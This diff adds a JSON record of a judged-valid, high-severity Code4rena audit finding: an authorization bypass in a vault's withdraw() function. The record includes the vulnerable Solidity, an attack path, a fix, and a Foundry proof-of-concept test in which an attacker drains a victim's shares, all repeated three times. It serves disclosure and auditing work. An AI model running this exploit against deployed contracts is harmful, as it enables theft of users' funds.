@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "hDxUg7kc8rW",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "hDxUg7kc8rW",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_hDxUg7kc8rW.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "hDxUg7kc8rW",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Authorization Bypass in WERC7575Vault.withdraw() Allows Fund Theft",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "renacoder",
+  "body": "## Finding description and impact\n\nThe `withdraw()` function in `WERC7575Vault` fails to verify that `msg.sender` is authorized to withdraw on behalf of the `owner`, allowing anyone to steal funds from users who have self-allowance.\n\n```solidity\n/* AUTHORIZATION:\n    * - msg.sender must be owner OR have allowance for the shares\n    * - Allows delegation to withdrawal operators\n    */\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) {\n        revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    }\n    if (owner == address(0)) {\n        revert IERC20Errors.ERC20InvalidSender(address(0));\n    }\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\n### Root Cause\n\nThe `WERC7575Vault.withdraw()` function does not implement the authorization check described in its comment. While the comment states \"msg.sender must be owner OR have allowance for the shares\", the function only calls `_shareToken.spendSelfAllowance(owner, shares)` which checks the owner's self-allowance, not the caller's authorization.\n\n### Attack Path\n\n1. Victim obtains self-allowance through validator permit signature\n2. Attacker calls `withdraw(assets, attacker_address, victim_address)`\n3. Function burns victim's shares and transfers assets to attacker\n4. Victim loses funds while attacker receives the assets\n\n### Impact\n\nComplete loss of funds for any user with self-allowance. Since self-allowance is required for normal operations (transfers, withdrawals), all active users are vulnerable to having their entire balance stolen.\n\n## Recommended mitigation steps\n\nAdd authorization check in the `withdraw()` function:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    if (msg.sender != owner) {\n        _shareToken.spendAllowance(owner, msg.sender, shares);\n    }\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
+  "proof_of_concept": "Add the following test function to the `AuditReproductionTest` contract in `AuditReproduction.t.sol` and run the test.\n\n```solidity\nfunction testWithdrawAuthorizationBypass() public {\n    // Deploy contracts\n    WERC7575ShareToken shareToken = new WERC7575ShareToken(\"Test Share\", \"TST\");\n    WERC7575Vault vault = new WERC7575Vault(address(asset), shareToken);\n    shareToken.registerVault(address(asset), address(vault));\n\n    // Setup validator\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    shareToken.setValidator(validator);\n\n    // Setup users\n    uint256 victimPk = 0x1001;\n    address victim = vm.addr(victimPk);\n    address attacker = address(0x1002);\n    \n    // KYC users\n    shareToken.setKycVerified(victim, true);\n\n    // Victim deposits funds\n    asset.mint(victim, 1000e18);\n    vm.prank(victim);\n    asset.approve(address(vault), 1000e18);\n    vm.prank(victim);\n    vault.deposit(1000e18, victim);\n\n    uint256 withdrawAmount = 500e18;\n    uint256 deadline = block.timestamp + 1 hours;\n    \n    // Victim gets self-allowance permit\n    bytes32 permitHash = keccak256(abi.encode(\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n        victim, victim, withdrawAmount, shareToken.nonces(victim), deadline\n    ));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), permitHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n    \n    vm.prank(victim);\n    shareToken.permit(victim, victim, withdrawAmount, deadline, v, r, s);\n    \n    // Attacker steals victim's funds\n    vm.prank(attacker);\n    vault.withdraw(withdrawAmount, attacker, victim);\n    \n    // Verify theft\n    assertEq(asset.balanceOf(attacker), withdrawAmount);\n    assertEq(shareToken.balanceOf(victim), 500e18); // Half stolen\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "949",
+    "api_submission_id": "",
+    "uid": "hDxUg7kc8rW",
+    "number": "949",
+    "title": "Authorization Bypass in WERC7575Vault.withdraw() Allows Fund Theft",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "renacoder",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437"
+    ],
+    "body": "## Finding description and impact\n\nThe `withdraw()` function in `WERC7575Vault` fails to verify that `msg.sender` is authorized to withdraw on behalf of the `owner`, allowing anyone to steal funds from users who have self-allowance.\n\n```solidity\n/* AUTHORIZATION:\n    * - msg.sender must be owner OR have allowance for the shares\n    * - Allows delegation to withdrawal operators\n    */\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) {\n        revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    }\n    if (owner == address(0)) {\n        revert IERC20Errors.ERC20InvalidSender(address(0));\n    }\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\n### Root Cause\n\nThe `WERC7575Vault.withdraw()` function does not implement the authorization check described in its comment. While the comment states \"msg.sender must be owner OR have allowance for the shares\", the function only calls `_shareToken.spendSelfAllowance(owner, shares)` which checks the owner's self-allowance, not the caller's authorization.\n\n### Attack Path\n\n1. Victim obtains self-allowance through validator permit signature\n2. Attacker calls `withdraw(assets, attacker_address, victim_address)`\n3. Function burns victim's shares and transfers assets to attacker\n4. Victim loses funds while attacker receives the assets\n\n### Impact\n\nComplete loss of funds for any user with self-allowance. Since self-allowance is required for normal operations (transfers, withdrawals), all active users are vulnerable to having their entire balance stolen.\n\n## Recommended mitigation steps\n\nAdd authorization check in the `withdraw()` function:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    if (msg.sender != owner) {\n        _shareToken.spendAllowance(owner, msg.sender, shares);\n    }\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
+    "proof_of_concept": "Add the following test function to the `AuditReproductionTest` contract in `AuditReproduction.t.sol` and run the test.\n\n```solidity\nfunction testWithdrawAuthorizationBypass() public {\n    // Deploy contracts\n    WERC7575ShareToken shareToken = new WERC7575ShareToken(\"Test Share\", \"TST\");\n    WERC7575Vault vault = new WERC7575Vault(address(asset), shareToken);\n    shareToken.registerVault(address(asset), address(vault));\n\n    // Setup validator\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    shareToken.setValidator(validator);\n\n    // Setup users\n    uint256 victimPk = 0x1001;\n    address victim = vm.addr(victimPk);\n    address attacker = address(0x1002);\n    \n    // KYC users\n    shareToken.setKycVerified(victim, true);\n\n    // Victim deposits funds\n    asset.mint(victim, 1000e18);\n    vm.prank(victim);\n    asset.approve(address(vault), 1000e18);\n    vm.prank(victim);\n    vault.deposit(1000e18, victim);\n\n    uint256 withdrawAmount = 500e18;\n    uint256 deadline = block.timestamp + 1 hours;\n    \n    // Victim gets self-allowance permit\n    bytes32 permitHash = keccak256(abi.encode(\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n        victim, victim, withdrawAmount, shareToken.nonces(victim), deadline\n    ));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), permitHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n    \n    vm.prank(victim);\n    shareToken.permit(victim, victim, withdrawAmount, deadline, v, r, s);\n    \n    // Attacker steals victim's funds\n    vm.prank(attacker);\n    vault.withdraw(withdrawAmount, attacker, victim);\n    \n    // Verify theft\n    assertEq(asset.balanceOf(attacker), withdrawAmount);\n    assertEq(shareToken.balanceOf(victim), 500e18); // Half stolen\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/949",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-05T15:25:43.224Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "Abz4BAX8xnM",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:14:12.187Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "hDxUg7kc8rW",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Authorization Bypass in WERC7575Vault.withdraw() Allows Fund Theft",
+      "uid": "hDxUg7kc8rW",
+      "updatedAt": "2025-12-05T15:25:43.224Z",
+      "user": {
+        "uid": "CpgtUxWELv3",
+        "handle": "renacoder"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe `withdraw()` function in `WERC7575Vault` fails to verify that `msg.sender` is authorized to withdraw on behalf of the `owner`, allowing anyone to steal funds from users who have self-allowance.\n\n```solidity\n/* AUTHORIZATION:\n    * - msg.sender must be owner OR have allowance for the shares\n    * - Allows delegation to withdrawal operators\n    */\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) {\n        revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    }\n    if (owner == address(0)) {\n        revert IERC20Errors.ERC20InvalidSender(address(0));\n    }\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\n### Root Cause\n\nThe `WERC7575Vault.withdraw()` function does not implement the authorization check described in its comment. While the comment states \"msg.sender must be owner OR have allowance for the shares\", the function only calls `_shareToken.spendSelfAllowance(owner, shares)` which checks the owner's self-allowance, not the caller's authorization.\n\n### Attack Path\n\n1. Victim obtains self-allowance through validator permit signature\n2. Attacker calls `withdraw(assets, attacker_address, victim_address)`\n3. Function burns victim's shares and transfers assets to attacker\n4. Victim loses funds while attacker receives the assets\n\n### Impact\n\nComplete loss of funds for any user with self-allowance. Since self-allowance is required for normal operations (transfers, withdrawals), all active users are vulnerable to having their entire balance stolen.\n\n## Recommended mitigation steps\n\nAdd authorization check in the `withdraw()` function:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    if (msg.sender != owner) {\n        _shareToken.spendAllowance(owner, msg.sender, shares);\n    }\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
+      "proofOfConcept": "Add the following test function to the `AuditReproductionTest` contract in `AuditReproduction.t.sol` and run the test.\n\n```solidity\nfunction testWithdrawAuthorizationBypass() public {\n    // Deploy contracts\n    WERC7575ShareToken shareToken = new WERC7575ShareToken(\"Test Share\", \"TST\");\n    WERC7575Vault vault = new WERC7575Vault(address(asset), shareToken);\n    shareToken.registerVault(address(asset), address(vault));\n\n    // Setup validator\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    shareToken.setValidator(validator);\n\n    // Setup users\n    uint256 victimPk = 0x1001;\n    address victim = vm.addr(victimPk);\n    address attacker = address(0x1002);\n    \n    // KYC users\n    shareToken.setKycVerified(victim, true);\n\n    // Victim deposits funds\n    asset.mint(victim, 1000e18);\n    vm.prank(victim);\n    asset.approve(address(vault), 1000e18);\n    vm.prank(victim);\n    vault.deposit(1000e18, victim);\n\n    uint256 withdrawAmount = 500e18;\n    uint256 deadline = block.timestamp + 1 hours;\n    \n    // Victim gets self-allowance permit\n    bytes32 permitHash = keccak256(abi.encode(\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n        victim, victim, withdrawAmount, shareToken.nonces(victim), deadline\n    ));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), permitHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n    \n    vm.prank(victim);\n    shareToken.permit(victim, victim, withdrawAmount, deadline, v, r, s);\n    \n    // Attacker steals victim's funds\n    vm.prank(attacker);\n    vault.withdraw(withdrawAmount, attacker, victim);\n    \n    // Verify theft\n    assertEq(asset.balanceOf(attacker), withdrawAmount);\n    assertEq(shareToken.balanceOf(victim), 500e18); // Half stolen\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437",
+      "number": 949,
+      "aiExplanation": null,
+      "_index": 949
+    }
+  }
+}
